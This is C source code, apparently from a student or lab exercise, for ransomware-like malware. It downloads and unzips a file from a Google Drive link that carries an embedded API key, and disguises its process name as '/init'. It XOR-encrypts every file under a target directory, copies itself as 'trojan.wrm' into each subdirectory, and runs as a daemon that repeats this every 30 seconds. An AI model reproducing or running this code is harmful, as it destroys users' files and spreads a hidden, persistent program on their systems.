#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <curl/curl.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>

unsigned char xor_key;

void encrypt_file(const char *filepath, unsigned char key) {
    FILE *fp = fopen(filepath, "rb+");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    rewind(fp);

    unsigned char *buffer = malloc(filesize);
    if (!buffer) {
        fclose(fp);
        return;
    }

    fread(buffer, 1, filesize, fp);
    rewind(fp);

    for (long i = 0; i < filesize; i++) {
        buffer[i] ^= key;
    }

    fwrite(buffer, 1, filesize, fp);
    fclose(fp);
    free(buffer);
}

void encrypt_recursive(const char *base_path, unsigned char key) {
    struct dirent *dp;
    DIR *dir = opendir(base_path);
    if (!dir) return;

    char path[1024];

    while ((dp = readdir(dir)) != NULL) {
        if (strcmp(dp->d_name, ".") == 0 || strcmp(dp->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", base_path, dp->d_name);

        struct stat path_stat;
        if (stat(path, &path_stat) == -1) continue;

        if (S_ISDIR(path_stat.st_mode)) {
            encrypt_recursive(path, key);
        } else if (S_ISREG(path_stat.st_mode)) {
            encrypt_file(path, key);
        }
    }

    closedir(dir);
}

void spread_trojan(const char *target_dir, const char *malware_path) {
    DIR *dir = opendir(target_dir);
    if (!dir) return;

    struct dirent *entry;
    char path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", target_dir, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            spread_trojan(path, malware_path);
        }
    }

    char dest_path[1024];
    snprintf(dest_path, sizeof(dest_path), "%s/trojan.wrm", target_dir);

    FILE *src = fopen(malware_path, "rb");
    FILE *dst = fopen(dest_path, "wb");
    if (src && dst) {
        char buf[4096];
        size_t bytes;
        while ((bytes = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, bytes, dst);
        }
    }
    if (src) fclose(src);
    if (dst) fclose(dst);

    closedir(dir);
}

void become_daemon(const char *target_dir, const char *self_path) {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);

    while (1) {
        time_t timestamp = time(NULL);
        unsigned char key = (unsigned char)(timestamp % 256);

        encrypt_recursive(target_dir, key);
        spread_trojan(target_dir, self_path);

        sleep(30);
    }
}

int download_and_unzip() {
    CURL *curl;
    FILE *fp;
    CURLcode res;

    const char *url = "https://www.googleapis.com/drive/v3/files/12COBJZHO3orgy8LYCVOIVr0DPvI0Twzy?alt=media&key=AIzaSyB6kgi_bSqmnbnMxydPwnC2UFsBj4VPId8";
    const char *outfilename = "test.zip";

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(outfilename, "wb");
        if (!fp) return 1;

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) return 1;
    } else {
        return 1;
    }

    char unzip_command[256];
    snprintf(unzip_command, sizeof(unzip_command), "unzip -o %s", outfilename);
    int unzip_res = system(unzip_command);
    if (unzip_res != 0) return 1;

    return 0;
}

int main(int argc, char **argv) {

    const char *fake_name = "/init";
    size_t fake_len = strlen(fake_name);
    size_t argv0_len = strlen(argv[0]);

    if (argv0_len >= fake_len) {
        memset(argv[0], 0, argv0_len);
        strncpy(argv[0], fake_name, argv0_len);
    }

    prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);

    const char *target_dir = "/home/evaldhio/new-folder/FiraCode/";

    if (download_and_unzip() == 0) {
        xor_key = (unsigned char)(time(NULL) & 0xFF);

        encrypt_recursive(target_dir, xor_key);

        char self_path[1024];
        ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
        if (len != -1) {
            self_path[len] = '\0';
            spread_trojan(target_dir, self_path);

            become_daemon(target_dir, self_path);
        } else {
            fprintf(stderr, "Gagal mendapatkan path executable.\n");
            return 1;
        }
    } else {
        fprintf(stderr, "Proses download atau extract gagal. Program dihentikan.\n");
        return 1;
    }

    return 0;
}
